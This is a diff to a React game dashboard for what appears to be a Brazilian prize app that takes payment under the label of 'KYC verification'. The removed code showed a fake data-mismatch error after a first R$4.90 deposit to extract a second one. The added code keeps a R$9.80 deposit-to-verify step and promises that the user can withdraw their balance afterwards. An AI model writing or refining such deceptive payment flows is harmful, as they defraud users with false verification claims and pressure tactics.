@@ -9,7 +9,6 @@ import { SocialProofNotifications } from './SocialProofNotifications';
 import { PrizesSection } from './PrizesSection';
 import { MoneyPrizeModal } from './MoneyPrizeModal';
 import { KYCVerificationModal } from './KYCVerificationModal';
-import { DataMismatchModal } from './DataMismatchModal';
 import { trackPurchase } from '../utils/tracking';
 import {
   Play,
@@ -77,9 +76,7 @@ export const GameDashboard: React.FC<GameDashboardProps> = ({ user }) => {
   const [showMoneyPrizeModal, setShowMoneyPrizeModal] = useState(false);
   const [showWithdrawModal, setShowWithdrawModal] = useState(false);
   const [showKYCModal, setShowKYCModal] = useState(false);
-  const [showDataMismatchModal, setShowDataMismatchModal] = useState(false);
   const [kycDepositAmount, setKycDepositAmount] = useState<number | null>(null);
-  const [depositedAmount, setDepositedAmount] = useState<number>(0);
   const [wonAmount, setWonAmount] = useState(0);
   const [isPlayingCard, setIsPlayingCard] = useState(false);
 
@@ -137,52 +134,22 @@ export const GameDashboard: React.FC<GameDashboardProps> = ({ user }) => {
 
   const handleAddBalance = (amount: number) => {
     if (kycDepositAmount && amount >= kycDepositAmount) {
-      const currentDepositAttempts = gameState.kycStatus?.depositAttempts || 0;
+      // Creditar saldo imediatamente
+      addBalance(amount);
+      trackPurchase(amount);
 
-      if (currentDepositAttempts === 0) {
-        setDepositedAmount(amount);
+      // Marcar KYC como verificado
+      const updatedKYC = {
+        ...gameState.kycStatus,
+        depositVerified: true,
+        isVerified: true,
+        identityVerified: true
+      };
+      updateKYCStatus(updatedKYC);
 
-        // Enviar evento de compra no PRIMEIRO deposito (unico e desduplicado)
-        trackPurchase(amount);
-
-        const updatedKYC = {
-          ...gameState.kycStatus,
-          depositAttempts: 1,
-          hasFailedFirstAttempt: true,
-          identityVerified: true,
-          depositVerified: false,
-          isVerified: false
-        };
-        updateKYCStatus(updatedKYC);
-
-        setShowAddBalanceModal(false);
-
-        setTimeout(() => {
-          setShowDataMismatchModal(true);
-        }, 500);
-        return;
-      }
-
-      if (currentDepositAttempts === 1) {
-        const totalAmount = amount + depositedAmount;
-        addBalance(totalAmount);
-        // NAO envia evento de compra no segundo deposito para evitar duplicacao
-
-        const updatedKYC = {
-          ...gameState.kycStatus,
-          depositVerified: true,
-          isVerified: true,
-          identityVerified: true,
-          depositAttempts: 2,
-          hasFailedFirstAttempt: false
-        };
-        updateKYCStatus(updatedKYC);
-
-        setKycDepositAmount(null);
-        setDepositedAmount(0);
-        setShowAddBalanceModal(false);
-        return;
-      }
+      setKycDepositAmount(null);
+      setShowAddBalanceModal(false);
+      return;
     }
 
     addBalance(amount);
@@ -219,29 +186,13 @@ export const GameDashboard: React.FC<GameDashboardProps> = ({ user }) => {
 
   const handleVerifyAccount = () => {
     setShowKYCModal(false);
-    setKycDepositAmount(4.90);
+    setKycDepositAmount(9.80);
     setShowAddBalanceModal(true);
-  };
-
-  const handleReviewData = () => {
-    setShowDataMismatchModal(false);
-    setKycDepositAmount(4.90);
-    setTimeout(() => {
-      setShowKYCModal(true);
-    }, 300);
   };
 
   const getDepositMessage = () => {
     if (kycDepositAmount) {
-      const currentDepositAttempts = gameState.kycStatus?.depositAttempts || 0;
-
-      if (currentDepositAttempts === 1) {
-        // Segundo depósito - mensagem mais clara sobre reembolso
-        return `IMPORTANTE:Apos verificacao, voce podera sacar todo o seu saldo disponivel.`;
-      }
-
-      // Primeiro depósito
-      return 'Apos verificacao, voce podera sacar todo o seu saldo disponivel. O deposito de R$ 4,90 sera creditado automaticamente.';
+      return 'Apos verificacao, voce podera sacar todo o seu saldo disponivel. O deposito de R$ 9,80 sera creditado automaticamente.';
     }
 
     if (!canPlay) {
@@ -476,15 +427,9 @@ export const GameDashboard: React.FC<GameDashboardProps> = ({ user }) => {
       <KYCVerificationModal
         isOpen={showKYCModal}
         onClose={() => setShowKYCModal(false)}
-        kycStatus={gameState.kycStatus || { isVerified: false, identityVerified: false, depositVerified: false, depositAttempts: 0 }}
+        kycStatus={gameState.kycStatus || { isVerified: false, identityVerified: false, depositVerified: false }}
         onUpdateKYC={handleUpdateKYC}
         onVerifyAccount={handleVerifyAccount}
-      />
-
-      <DataMismatchModal
-        isOpen={showDataMismatchModal}
-        onReviewData={handleReviewData}
-        depositAmount={depositedAmount}
       />
 
       {/* Notificações Sociais */}
